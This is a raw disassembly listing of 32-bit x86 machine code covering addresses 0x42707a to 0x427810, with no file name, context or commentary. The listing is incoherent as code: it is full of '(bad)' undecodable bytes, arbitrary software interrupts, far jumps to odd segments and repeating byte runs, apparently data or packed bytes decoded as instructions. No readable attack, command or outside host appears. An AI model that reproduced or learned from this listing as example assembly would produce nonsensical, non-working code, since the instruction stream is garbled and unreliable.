  42707a:	shl    DWORD PTR [eax-0x40],cl
  42707d:	dec    esp
  42707e:	iret   
  42707f:	jbe    0x427051
  427081:	jo     0x427040
  427083:	mov    edi,0xcd0000fd
  427088:	jbe    0x42707f
  42708a:	int    0x8d
  42708c:	cmc    
  42708d:	int    0x89
  42708f:	int    0x80
  427091:	cmp    esi,eax
  427093:	cmp    edi,DWORD PTR [ecx-0x2d]
  427096:	repnz sub bl,dl
  427099:	mov    ebp,0xcad35392
  42709e:	je     0x427025
  4270a0:	ror    ch,1
  4270a2:	(bad)  
  4270a3:	std    
  4270a4:	int    0x96
  4270a6:	std    
  4270a7:	cmp    ecx,DWORD PTR [edi]
  4270a9:	cmp    ebx,ecx
  4270ab:	shr    ebx,cl
  4270ad:	xchg   edx,eax
  4270ae:	shr    edx,cl
  4270b0:	sub    BYTE PTR [edi],ch
  4270b2:	pop    ecx
  4270b3:	ins    DWORD PTR es:[edi],dx
  4270b4:	push   ebx
  4270b5:	adc    eax,DWORD PTR [ebx-0x2d]
  4270b8:	das    
  4270b9:	add    eax,0x80809212
  4270be:	int    0x76
  4270c0:	adc    ebp,ecx
  4270c2:	lea    edx,[ecx]
  4270c4:	int    0x89
  4270c6:	int    0x80
  4270c8:	cmp    esi,eax
  4270ca:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270cd:	repnz sub bl,dl
  4270d0:	mov    ebp,0xcad35392
  4270d5:	je     0x42705c
  4270d7:	ror    ch,1
  4270d9:	(bad)  
  4270da:	std    
  4270db:	int    0x96
  4270dd:	std    
  4270de:	cmp    ecx,DWORD PTR [edi]
  4270e0:	cmp    ebx,ecx
  4270e2:	shr    ebx,cl
  4270e4:	xchg   edx,eax
  4270e5:	shr    edx,cl
  4270e7:	sub    BYTE PTR [edi],ch
  4270e9:	pop    ecx
  4270ea:	ins    DWORD PTR es:[edi],dx
  4270eb:	push   ebx
  4270ec:	adc    eax,DWORD PTR [ebx-0x2d]
  4270ef:	das    
  4270f0:	add    eax,0x8080928a
  4270f5:	int    0x76
  4270f7:	adc    al,0xcd
  4270f9:	lea    edx,[ecx*8+0x3b80cd89]
  427100:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427104:	repnz sub bl,dl
  427107:	mov    ebp,0xcad35392
  42710c:	je     0x427093
  42710e:	ror    ch,1
  427110:	(bad)  
  427111:	std    
  427112:	int    0x96
  427114:	std    
  427115:	cmp    ecx,DWORD PTR [edi]
  427117:	cmp    ebx,ecx
  427119:	shr    ebx,cl
  42711b:	xchg   edx,eax
  42711c:	shr    edx,cl
  42711e:	sub    BYTE PTR [edi],ch
  427120:	pop    ecx
  427121:	ins    DWORD PTR es:[edi],dx
  427122:	push   ebx
  427123:	adc    eax,DWORD PTR [ebx-0x2d]
  427126:	das    
  427127:	add    eax,0x8080921b
  42712c:	int    0x76
  42712e:	in     eax,dx
  42712f:	int    0x8d
  427131:	in     eax,dx
  427132:	int    0x89
  427134:	int    0x80
  427136:	cmp    esi,eax
  427138:	cmp    edi,DWORD PTR [ecx-0x2d]
  42713b:	repnz sub bl,dl
  42713e:	mov    ebp,0xcad35392
  427143:	je     0x4270ca
  427145:	ror    ch,1
  427147:	(bad)  
  427148:	std    
  427149:	int    0x96
  42714b:	std    
  42714c:	cmp    ecx,DWORD PTR [edi]
  42714e:	cmp    ebx,ecx
  427150:	shr    ebx,cl
  427152:	xchg   edx,eax
  427153:	shr    edx,cl
  427155:	sub    BYTE PTR [edi],ch
  427157:	pop    ecx
  427158:	ins    DWORD PTR es:[edi],dx
  427159:	push   ebx
  42715a:	adc    eax,DWORD PTR [ebx-0x2d]
  42715d:	das    
  42715e:	add    eax,0x808081a5
  427163:	int    0x76
  427165:	adc    ebp,ecx
  427167:	lea    edx,[ecx]
  427169:	int    0x89
  42716b:	int    0x80
  42716d:	cmp    esi,eax
  42716f:	shl    edx,cl
  427171:	sub    BYTE PTR [ebx],bh
  427173:	jns    0x427148
  427175:	mov    ebp,0xcad35392
  42717a:	je     0x427101
  42717c:	ror    ch,1
  42717e:	(bad)  
  42717f:	cmc    
  427180:	int    0x89
  427182:	int    0x96
  427184:	cmc    
  427185:	int    0x22
  427187:	cmp    ecx,DWORD PTR [edi]
  427189:	shr    ebx,cl
  42718b:	xchg   edx,eax
  42718c:	cmp    ebx,ecx
  42718e:	shr    edx,cl
  427190:	sub    BYTE PTR [ebx+0x13],dl
  427193:	retf   0x4d8c
  427196:	rol    BYTE PTR [edx-0x2d],1
  427199:	int    0x8d
  42719b:	adc    al,0xcd
  42719d:	mov    ebp,ecx
  42719f:	xchg   esi,eax
  4271a0:	adc    al,0xcd
  4271a2:	and    bh,BYTE PTR [ebx]
  4271a4:	psrlq  mm5,mm3
  4271a7:	xchg   edx,eax
  4271a8:	cmp    ebx,ecx
  4271aa:	shr    edx,cl
  4271ac:	sub    BYTE PTR [ebx+0x13],dl
  4271af:	retf   0x4d8c
  4271b2:	ror    BYTE PTR [edx-0x2d],1
  4271b5:	int    0x8d
  4271b7:	cmc    
  4271b8:	int    0x89
  4271ba:	int    0x96
  4271bc:	cmc    
  4271bd:	int    0x22
  4271bf:	cmp    ecx,DWORD PTR [edi]
  4271c1:	cmp    ebx,ecx
  4271c3:	shr    ebx,cl
  4271c5:	xchg   edx,eax
  4271c6:	shr    edx,cl
  4271c8:	sub    BYTE PTR [ebx+0x13],dl
  4271cb:	retf   0x4d8c
  4271ce:	push   ebp
  4271cf:	pusha  
  4271d0:	jge    0x427201
  4271d2:	push   es
  4271d3:	mov    esp,0xcd808081
  4271d8:	jbe    0x4271ee
  4271da:	int    0x8d
  4271dc:	adc    al,0xcd
  4271de:	mov    ebp,ecx
  4271e0:	cmp    BYTE PTR [ebx],0xf0
  4271e3:	shl    edx,cl
  4271e5:	sub    BYTE PTR [ebx],bh
  4271e7:	jns    0x4271bc
  4271e9:	mov    ebp,0xcad35392
  4271ee:	je     0x427175
  4271f0:	ror    ch,1
  4271f2:	lea    edx,[ecx]
  4271f4:	int    0x89
  4271f6:	int    0x96
  4271f8:	adc    ebp,ecx
  4271fa:	and    bh,BYTE PTR [ebx]
  4271fc:	psrlq  mm5,mm3
  4271ff:	xchg   edx,eax
  427200:	cmp    ebx,ecx
  427202:	shr    edx,cl
  427204:	sub    BYTE PTR [ebx+0x13],dl
  427207:	retf   0x4d8c
  42720a:	rol    BYTE PTR [edx-0x2d],1
  42720d:	int    0x8d
  42720f:	in     eax,dx
  427210:	int    0x89
  427212:	int    0x96
  427214:	in     eax,dx
  427215:	int    0x22
  427217:	cmp    ecx,DWORD PTR [edi]
  427219:	shr    ebx,cl
  42721b:	xchg   edx,eax
  42721c:	cmp    ebx,ecx
  42721e:	shr    edx,cl
  427220:	sub    BYTE PTR [ebx+0x13],dl
  427223:	retf   0x4d8c
  427226:	ror    BYTE PTR [edx-0x2d],1
  427229:	int    0x8d
  42722b:	adc    ebp,ecx
  42722d:	mov    ebp,ecx
  42722f:	xchg   esi,eax
  427230:	adc    ebp,ecx
  427232:	and    bh,BYTE PTR [ebx]
  427234:	(bad)  
  427236:	(bad)  
  427238:	jmp    0x4271cc
  42723a:	shr    edx,cl
  42723c:	sub    BYTE PTR [ebx+0x13],dl
  42723f:	retf   0x4d8c
  427242:	push   ebp
  427243:	pusha  
  427244:	jge    0x427275
  427246:	push   es
  427247:	cmc    
  427248:	add    BYTE PTR [eax-0x12893280],0xcd
  42724f:	(bad)  
  427250:	in     eax,dx
  427251:	int    0x89
  427253:	int    0x80
  427255:	cmp    esi,eax
  427257:	shl    edx,cl
  427259:	sub    BYTE PTR [ebx],bh
  42725b:	jns    0x427230
  42725d:	mov    ebp,0xcad35392
  427262:	je     0x4271e9
  427264:	ror    ch,1
  427266:	lea    edx,[ecx*8+0x1496cd89]
  42726d:	int    0x22
  42726f:	cmp    ecx,DWORD PTR [edi]
  427271:	shr    ebx,cl
  427273:	xchg   edx,eax
  427274:	cmp    ebx,ecx
  427276:	shr    edx,cl
  427278:	sub    BYTE PTR [ebx+0x13],dl
  42727b:	retf   0x4d8c
  42727e:	rol    BYTE PTR [edx-0x2d],1
  427281:	int    0x8d
  427283:	cmc    
  427284:	int    0x89
  427286:	int    0x96
  427288:	cmc    
  427289:	int    0x22
  42728b:	cmp    ecx,DWORD PTR [edi]
  42728d:	shr    ebx,cl
  42728f:	xchg   edx,eax
  427290:	cmp    ebx,ecx
  427292:	shr    edx,cl
  427294:	sub    BYTE PTR [ebx+0x13],dl
  427297:	retf   0x4d8c
  42729a:	ror    BYTE PTR [edx-0x2d],1
  42729d:	int    0x8d
  42729f:	adc    al,0xcd
  4272a1:	mov    ebp,ecx
  4272a3:	xchg   esi,eax
  4272a4:	adc    al,0xcd
  4272a6:	and    bh,BYTE PTR [ebx]
  4272a8:	(bad)  
  4272aa:	(bad)  
  4272ac:	jmp    0x427240
  4272ae:	shr    edx,cl
  4272b0:	sub    BYTE PTR [ebx+0x13],dl
  4272b3:	retf   0x4d8c
  4272b6:	push   ebp
  4272b7:	pusha  
  4272b8:	jge    0x4272e9
  4272ba:	push   es
  4272bb:	add    DWORD PTR [eax+0x76cd8080],eax
  4272c1:	in     eax,dx
  4272c2:	int    0x8d
  4272c4:	in     eax,dx
  4272c5:	int    0x89
  4272c7:	int    0x80
  4272c9:	cmp    esi,eax
  4272cb:	shl    edx,cl
  4272cd:	sub    BYTE PTR [ebx],bh
  4272cf:	jns    0x4272a4
  4272d1:	mov    ebp,0xcad35392
  4272d6:	je     0x42725d
  4272d8:	ror    ch,1
  4272da:	(bad)  
  4272db:	cmc    
  4272dc:	int    0x89
  4272de:	int    0x96
  4272e0:	cmc    
  4272e1:	int    0x22
  4272e3:	cmp    ecx,DWORD PTR [edi]
  4272e5:	shr    ebx,cl
  4272e7:	xchg   edx,eax
  4272e8:	cmp    ebx,ecx
  4272ea:	shr    edx,cl
  4272ec:	sub    BYTE PTR [ebx+0x13],dl
  4272ef:	retf   0x4d8c
  4272f2:	rol    BYTE PTR [edx-0x2d],1
  4272f5:	int    0x8d
  4272f7:	adc    ebp,ecx
  4272f9:	mov    ebp,ecx
  4272fb:	xchg   esi,eax
  4272fc:	adc    ebp,ecx
  4272fe:	and    bh,BYTE PTR [ebx]
  427300:	psrlq  mm5,mm3
  427303:	xchg   edx,eax
  427304:	cmp    ebx,ecx
  427306:	shr    edx,cl
  427308:	sub    BYTE PTR [ebx+0x13],dl
  42730b:	retf   0x4d8c
  42730e:	ror    BYTE PTR [edx-0x2d],1
  427311:	int    0x8d
  427313:	in     eax,dx
  427314:	int    0x89
  427316:	int    0x96
  427318:	in     eax,dx
  427319:	int    0x22
  42731b:	cmp    ecx,DWORD PTR [edi]
  42731d:	cmp    ebx,ecx
  42731f:	shr    ebx,cl
  427321:	xchg   edx,eax
  427322:	shr    edx,cl
  427324:	sub    BYTE PTR [ebx+0x13],dl
  427327:	retf   0x4d8c
  42732a:	push   ebp
  42732b:	pusha  
  42732c:	jge    0x427304
  42732e:	xor    bh,cl
  427330:	jbe    0x427302
  427332:	jo     0x4272f1
  427334:	outs   dx,DWORD PTR ds:[esi]
  427335:	lods   eax,DWORD PTR ds:[esi]
  427336:	add    BYTE PTR [eax],al
  427338:	int    0x8d
  42733a:	pop    ebp
  42733b:	inc    ebx
  42733c:	rcl    esp,cl
  42733e:	push   ss
  42733f:	int    0x76
  427341:	std    
  427342:	int    0x8d
  427344:	std    
  427345:	cmp    esi,eax
  427347:	cmp    edi,DWORD PTR [ecx-0x2d]
  42734a:	repnz sub bl,dl
  42734d:	mov    ebp,0xad35392
  427352:	jbe    0x427301
  427354:	int    0x76
  427356:	stc    
  427357:	int    0xa6
  427359:	stc    
  42735a:	int    0x76
  42735c:	stc    
  42735d:	int    0x8d
  42735f:	stc    
  427360:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  427366:	xchg   edx,eax
  427367:	shr    DWORD PTR [ebp-0x7862acd8],cl
  42736d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42736e:	gs int 0x76
  427371:	xchg   ebp,eax
  427372:	cmp    ecx,DWORD PTR [edi]
  427374:	add    al,0xf2
  427376:	std    
  427377:	add    al,0xad
  427379:	std    
  42737a:	shr    esp,cl
  42737c:	sub    BYTE PTR [edi+0x12db537d],al
  427382:	hlt    
  427383:	dec    ecx
  427384:	and    DWORD PTR [esi-0x28932cb],eax
  42738a:	int    0x8d
  42738c:	std    
  42738d:	cmp    esi,eax
  42738f:	cmp    edi,DWORD PTR [ecx-0x2d]
  427392:	repnz sub bl,dl
  427395:	mov    ebp,0xcdd35392
  42739a:	lea    ebp,[ebp+0x52f7d43]
  4273a0:	push   ds
  4273a1:	std    
  4273a2:	add    BYTE PTR [eax],al
  4273a4:	int    0x76
  4273a6:	std    
  4273a7:	int    0x8d
  4273a9:	std    
  4273aa:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273ad:	lock shl edx,cl
  4273b0:	sub    bl,dl
  4273b2:	mov    ebp,0xcdd35392
  4273b7:	lea    ebp,[ebp+0x1ad67d43]
  4273bd:	int    0x76
  4273bf:	stc    
  4273c0:	int    0x8d
  4273c2:	stc    
  4273c3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273c6:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4273cd:	push   ebx
  4273ce:	shr    ebx,cl
  4273d0:	jle    0x427353
  4273d2:	add    BYTE PTR [eax+0x5b6324c0],0x0
  4273d9:	(bad)  
  4273da:	popf   
  4273db:	iret   
  4273dc:	jbe    0x4273f3
  4273de:	jo     0x42739d
  4273e0:	jge    0x4273bd
  4273e2:	add    BYTE PTR [eax],al
  4273e4:	int    0x76
  4273e6:	std    
  4273e7:	int    0x8d
  4273e9:	std    
  4273ea:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273ed:	lock shl edx,cl
  4273f0:	sub    bl,dl
  4273f2:	mov    ebp,0xcdd35392
  4273f7:	lea    esp,[ebp+0x5bd4d343]
  4273fd:	int    0x76
  4273ff:	stc    
  427400:	int    0x8d
  427402:	stc    
  427403:	cmp    edi,DWORD PTR [ecx+0x3b]
  427406:	lock shl edx,cl
  427409:	sub    bl,dl
  42740b:	mov    ebp,0xcdd35392
  427410:	lea    esp,[ebp+0x26d4d343]
  427416:	int    0x76
  427418:	stc    
  427419:	int    0x8d
  42741b:	stc    
  42741c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42741f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427426:	push   ebx
  427427:	shl    DWORD PTR [eax+0x5b],cl
  42742a:	iret   
  42742b:	jbe    0x427442
  42742d:	jo     0x4273ec
  42742f:	das    
  427430:	cli    
  427431:	add    BYTE PTR [eax],al
  427433:	int    0x76
  427435:	std    
  427436:	int    0x8d
  427438:	std    
  427439:	cmp    edi,DWORD PTR [ecx+0x3b]
  42743c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427443:	push   ebx
  427444:	shl    DWORD PTR [eax+0x5b],cl
  427447:	iret   
  427448:	jbe    0x42745f
  42744a:	jo     0x427409
  42744c:	sti    
  42744d:	stc    
  42744e:	add    BYTE PTR [eax],al
  427450:	int    0x76
  427452:	popf   
  427453:	xchg   ebp,eax
  427455:	or     dh,BYTE PTR [esi+0x14]
  427458:	add    dh,dl
  42745a:	cmp    eax,0xcd14d600
  42745f:	jbe    0x427496
  427461:	xchg   DWORD PTR [esi-0x78],esi
  427464:	jo     0x427423
  427466:	push   edx
  427467:	fild   DWORD PTR [eax]
  427469:	add    ch,cl
  42746b:	jbe    0x42746a
  42746d:	int    0x8d
  42746f:	std    
  427470:	cmp    edi,DWORD PTR [ecx+0x3b]
  427473:	lock shl edx,cl
  427476:	sub    bl,dl
  427478:	mov    ebp,0xcdd35392
  42747d:	lea    esp,[ebp-0x592b2cbd]
  427483:	int    0x76
  427485:	stc    
  427486:	int    0x8d
  427488:	stc    
  427489:	cmp    edi,DWORD PTR [ecx+0x3b]
  42748c:	lock shl edx,cl
  42748f:	sub    bl,dl
  427491:	mov    ebp,0xcdd35392
  427496:	lea    esp,[ebp+0x32d4d343]
  42749c:	int    0x76
  42749e:	stc    
  42749f:	int    0x8d
  4274a1:	stc    
  4274a2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274a5:	mov    ebp,0xd3f03b92
  4274aa:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274ae:	jo     0x4274b0
  4274b0:	(bad)  
  4274b1:	cmp    eax,0x873576cd
  4274b6:	jbe    0x427440
  4274b8:	jo     0x427477
  4274ba:	add    eax,0xcd0000f9
  4274bf:	jbe    0x4274be
  4274c1:	int    0x8d
  4274c3:	std    
  4274c4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274c7:	mov    ebp,0xd3f03b92
  4274cc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274d0:	jo     0x4274d2
  4274d2:	(bad)  
  4274d3:	cmp    eax,0x873576cd
  4274d8:	jbe    0x427462
  4274da:	jo     0x427499
  4274dc:	jb     0x4274d7
  4274de:	add    BYTE PTR [eax],al
  4274e0:	int    0x8d
  4274e2:	inc    ebp
  4274e3:	int    0x76
  4274e5:	inc    ebp
  4274e6:	cmp    ecx,ecx
  4274e8:	cmp    ecx,DWORD PTR [edi]
  4274ea:	shr    ebx,cl
  4274ec:	xchg   edx,eax
  4274ed:	shr    DWORD PTR [ebp-0x322cacd8],cl
  4274f3:	lea    ebp,ds:0x803fd33b
  4274f9:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427503:	jo     0x427505
  427505:	(bad)  
  427506:	cmp    eax,0x87358dcd
  42750b:	lea    ecx,[eax+0xa95abd]
  427511:	add    ch,cl
  427513:	jbe    0x427545
  427515:	int    0x8d
  427517:	cmp    eax,0x76cd8881
  42751c:	cmp    eax,0xabd7687
  427521:	jbe    0x4274e0
  427523:	int    0x76
  427525:	stc    
  427526:	int    0x8d
  427528:	stc    
  427529:	cmp    esi,eax
  42752b:	shl    edx,cl
  42752d:	sub    BYTE PTR [ebx],bh
  42752f:	jns    0x427504
  427531:	mov    ebp,0xcdd35392
  427536:	lea    edi,[ebp-0x322c2ed1]
  42753c:	(bad)  
  42753d:	std    
  42753e:	int    0x96
  427540:	std    
  427541:	cmp    ecx,DWORD PTR [edi]
  427543:	cmp    ebx,ecx
  427545:	shr    ebx,cl
  427547:	xchg   edx,eax
  427548:	shr    edx,cl
  42754a:	sub    BYTE PTR [ebx+0x13],dl
  42754d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  427553:	or     edi,DWORD PTR [ecx]
  427555:	cli    
  427556:	add    BYTE PTR [eax],al
  427558:	int    0x76
  42755a:	mov    BYTE PTR [edx-0x2d349c58],ch
  427560:	xor    BYTE PTR [eax+0x4edcd96],al
  427566:	in     eax,dx
  427567:	adc    al,0x5b
  427569:	cwde   
  42756a:	call   0xcd34:0x76cd6d3b
  427571:	add    DWORD PTR ds:0xcd808081,ebp
  427577:	xchg   esi,eax
  427578:	mov    ch,cl
  42757a:	or     ch,0xd6
  42757d:	dec    esp
  42757e:	int    0xe6
  427580:	mov    ch,cl
  427582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427583:	dec    esp
  427584:	or     dh,BYTE PTR [esi-0x3]
  427587:	pop    edi
  427588:	jnp    0x4275c1
  42758a:	ficom  WORD PTR [ebx]
  42758c:	cmp    esp,ebx
  42758e:	pop    ebp
  42758f:	mov    ebp,0x3b25230a
  427594:	adc    DWORD PTR [edi],ebp
  427596:	inc    ebp
  427597:	sti    
  427598:	xchg   edx,eax
  427599:	shr    ecx,cl
  42759b:	sub    BYTE PTR [edx],dl
  42759d:	clc    
  42759e:	add    BYTE PTR [eax-0x102c9380],0x92
  4275a5:	cmp    ebx,ebp
  4275a7:	push   ebx
  4275a8:	clc    
  4275a9:	int    0xe6
  4275ab:	sbb    al,0x53
  4275ad:	aad    0x43
  4275af:	(bad)  
  4275b1:	sbb    eax,DWORD PTR [ebx-0xc]
  4275b4:	(bad)  
  4275b5:	das    
  4275b6:	adc    cl,BYTE PTR [ebp+0x59]
  4275b9:	je     0x427565
  4275bb:	push   edi
  4275bc:	ja     0x427583
  4275be:	xchg   edi,eax
  4275bf:	shr    ebx,0xd9
  4275c2:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  4275cc:	xchg   esi,eax
  4275cd:	mov    ch,cl
  4275cf:	(bad)  
  4275d0:	dec    esp
  4275d1:	int    0x96
  4275d3:	mov    ch,cl
  4275d5:	(bad)  
  4275d6:	dec    esp
  4275d7:	int    0xe6
  4275d9:	mov    ch,cl
  4275db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275dc:	dec    esp
  4275dd:	cmp    edx,DWORD PTR [ecx]
  4275df:	cmp    esp,ebx
  4275e1:	das    
  4275e2:	inc    ebp
  4275e3:	sti    
  4275e4:	xchg   edx,eax
  4275e5:	shr    ecx,cl
  4275e7:	sub    BYTE PTR [edx],dl
  4275e9:	clc    
  4275ea:	add    BYTE PTR [eax-0x22c49380],0x53
  4275f1:	aad    0xd3
  4275f3:	out    dx,eax
  4275f4:	xchg   edx,eax
  4275f5:	push   ebx
  4275f6:	clc    
  4275f7:	int    0xe6
  4275f9:	xor    ch,cl
  4275fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275fc:	adc    al,0x3b
  4275fe:	popf   
  4275ff:	int    0x76
  427601:	xor    BYTE PTR [ebx],bh
  427603:	cli    
  427604:	int    0x8d
  427606:	adc    al,0x2f
  427608:	inc    ebp
  427609:	loope  0x42759d
  42760b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427611:	cli    
  427612:	push   esi
  427613:	add    BYTE PTR [eax-0x132c9380],0x92
  42761a:	push   ebx
  42761b:	popf   
  42761c:	int    0x76
  42761e:	mov    BYTE PTR [edi-0x320be427],al
  427624:	bswap  ebp
  427626:	(bad)  
  427627:	dec    esp
  427628:	int    0xe6
  42762a:	xor    ch,cl
  42762c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42762d:	adc    al,0x4
  42762f:	lods   eax,DWORD PTR ds:[esi]
  427630:	std    
  427631:	add    al,0xe9
  427633:	std    
  427634:	shr    ebx,cl
  427636:	sub    BYTE PTR [ebx],bh
  427638:	ficom  DWORD PTR [esi-0x2c]
  42763b:	aaa    
  42763c:	ficom  WORD PTR [ebx]
  42763e:	adc    dh,bh
  427640:	mov    ebp,0x1225230a
  427645:	clc    
  427646:	aam    0x37
  427648:	ficom  WORD PTR [ebx]
  42764a:	adc    dh,ah
  42764c:	mov    ebp,0x8725230a
  427651:	leave  
  427652:	sbb    esi,esp
  427654:	push   ebx
  427655:	jge    0x4276aa
  427657:	cdq    
  427658:	pop    ebp
  427659:	mov    ebp,0x1225230a
  42765e:	add    dl,dh
  427660:	aaa    
  427661:	ficom  WORD PTR [ebx]
  427663:	cmp    esi,ecx
  427665:	adc    bh,dl
  427667:	out    0x37,al
  427669:	ficom  WORD PTR [ebx]
  42766b:	(bad)  
  42766c:	sbb    eax,DWORD PTR [ebx-0xf]
  42766f:	(bad)  
  427670:	das    
  427671:	adc    dl,BYTE PTR [esi-0x1]
  427674:	das    
  427675:	stos   DWORD PTR es:[edi],eax
  427676:	push   es
  427677:	in     eax,0x9b
  427679:	xchg   edi,eax
  42767a:	imul   bl
  42767c:	and    al,0x81
  42767e:	add    BYTE PTR [eax-0x32776933],0xd6
  427685:	dec    esp
  427686:	int    0xa6
  427688:	mov    ch,cl
  42768a:	out    0x4c,al
  42768c:	cmp    edx,DWORD PTR [ecx]
  42768e:	pop    edi
  42768f:	jnp    0x4276c8
  427691:	ficom  WORD PTR [ebx]
  427693:	cmp    esp,ebx
  427695:	das    
  427696:	inc    ebp
  427697:	sti    
  427698:	xchg   edx,eax
  427699:	shr    edi,cl
  42769b:	xchg   edx,eax
  42769c:	cmp    eax,DWORD PTR [eax]
  42769e:	shl    ebp,cl
  4276a0:	sub    BYTE PTR [edx],cl
  4276a2:	(bad)  
  4276a3:	cmc    
  4276a4:	push   ebx
  4276a5:	fxch   st(5)
  4276a7:	out    0xf5,al
  4276a9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  4276b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276b4:	and    al,0xcd
  4276b6:	and    ecx,DWORD PTR [edx]
  4276b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276b9:	adc    DWORD PTR [ebx-0x1e],eax
  4276bc:	(bad)  
  4276bd:	xchg   BYTE PTR [ebx],bh
  4276bf:	fiadd  DWORD PTR [ebx-0x27]
  4276c2:	aam    0x20
  4276c4:	add    dh,dl
  4276c6:	xor    al,0xcd
  4276c8:	(bad)  
  4276c9:	and    al,0x0
  4276cb:	(bad)  
  4276cc:	sub    al,0x0
  4276ce:	(bad)  
  4276cf:	std    
  4276d0:	add    BYTE PTR [eax-0x43],bl
  4276d3:	sub    edi,eax
  4276d5:	add    BYTE PTR [eax],al
  4276d7:	or     al,BYTE PTR [esi-0x7f7f9615]
  4276dd:	or     ch,0x96
  4276e0:	mov    ch,cl
  4276e2:	out    0x4c,al
  4276e4:	cmp    edi,ecx
  4276e6:	cmp    esp,ebx
  4276e8:	das    
  4276e9:	inc    ebp
  4276ea:	add    edx,DWORD PTR [edx+0xa9210d3]
  4276f0:	out    0xf5,al
  4276f2:	int    0xe6
  4276f4:	mov    ch,cl
  4276f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f7:	dec    esp
  4276f8:	shr    ecx,cl
  4276fa:	sub    BYTE PTR [ebx],bh
  4276fc:	dec    ebp
  4276fe:	(bad)  
  4276ff:	cmc    
  427700:	cmp    ebx,ebp
  427702:	push   ebx
  427703:	clc    
  427704:	int    0xe6
  427706:	xor    BYTE PTR [ebx],bh
  427708:	cli    
  427709:	push   ebx
  42770a:	aad    0xcd
  42770c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42770d:	adc    al,0x3b
  42770f:	popf   
  427710:	int    0xc9
  427712:	int    0xe6
  427714:	xor    ch,cl
  427716:	or     al,0xcd
  427718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427719:	adc    al,0x2f
  42771b:	inc    ebp
  42771c:	jge    0x4276b0
  42771e:	shr    ecx,cl
  427720:	sub    BYTE PTR [ebx],bh
  427722:	fst    st(3)
  427724:	jmp    0x4276b8
  427726:	adc    bh,al
  427728:	add    BYTE PTR [eax-0x3aac9380],0x53
  42772f:	lock inc ebx
  427731:	icebp  
  427732:	(bad)  
  427733:	sbb    BYTE PTR [ebx+0x2],al
  427736:	(bad)  
  427737:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42773d:	mov    esi,0xdd8bf56d
  427742:	(bad)  
  427743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427744:	cmp    edi,esp
  427746:	sbb    eax,0xcd62ec76
  42774b:	jbe    0x4276d5
  42774d:	int    0x8d
  42774f:	dec    esp
  427750:	int    0x96
  427752:	mov    ch,cl
  427754:	(bad)  
  427755:	dec    esp
  427756:	adc    al,BYTE PTR [edx]
  427758:	mov    ebp,0x5625230a
  42775d:	jnp    0x427796
  42775f:	ficom  WORD PTR [ebx]
  427761:	das    
  427762:	inc    ebp
  427763:	jge    0x4276f7
  427765:	int    0xfb
  427767:	cmp    eax,DWORD PTR [eax]
  427769:	cmp    ebx,edx
  42776b:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  427771:	jmp    0x427705
  427773:	adc    dh,bh
  427775:	add    BYTE PTR [eax-0x36ac9380],0x53
  42777c:	divps  xmm6,XMMWORD PTR [esi-0x3]
  427780:	(bad)  
  427781:	test   BYTE PTR [ebx-0x1d],al
  427784:	aam    0x4c
  427786:	adc    al,BYTE PTR [esi-0x3e]
  427789:	gs sub al,0x1
  42778c:	jo     0x4277c8
  42778e:	mov    edx,0x124aece0
  427793:	ss inc edx
  427795:	das    
  427796:	sbb    edx,esi
  427798:	mov    ebx,0xaa029f75
  42779d:	test   al,0x63
  42779f:	retf   
  4277a0:	shr    BYTE PTR [eax+eax*4],cl
  4277a3:	xchg   esi,eax
  4277a4:	int    0xed
  4277a6:	add    al,0xed
  4277a8:	dec    esp
  4277a9:	int    0x76
  4277ab:	mov    ch,cl
  4277ad:	lea    ecx,[edi+ebp*1+0x45]
  4277b1:	jge    0x427745
  4277b3:	shr    ebx,cl
  4277b5:	xchg   edx,eax
  4277b6:	int    0x8d
  4277b8:	mov    ch,cl
  4277ba:	xchg   esi,eax
  4277bb:	dec    esp
  4277bc:	cwde   
  4277bd:	shl    edx,cl
  4277bf:	sub    ch,cl
  4277c1:	lea    ebx,[ecx+ebp*2]
  4277c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277c5:	mov    esi,0x793b4229
  4277ca:	cmp    ebx,edx
  4277cc:	push   ebx
  4277cd:	ror    BYTE PTR [edx],cl
  4277cf:	or     ebp,0x1cd2476
  4277d5:	xor    eax,0xcd808081
  4277da:	mov    ch,cl
  4277dc:	jbe    0x427802
  4277de:	int    0x1
  4277e0:	xor    eax,0xcd808081
  4277e5:	add    BYTE PTR [edi-0x72329b92],0x24
  4277ec:	int    0xa
  4277ee:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  4277f4:	adc    al,0xc0
  4277f6:	test   BYTE PTR [eax+eax*4+0x808050],bh
  4277fd:	nop
  4277fe:	jo     0x427862
  427800:	add    bl,ah
  427802:	or     cl,BYTE PTR [ebx-0x32778933]
  427808:	lea    ecx,[edi+ebp*1+0x45]
  42780c:	jge    0x4277a0
  42780e:	shr    ebx,cl
  427810:	xchg   edx,eax
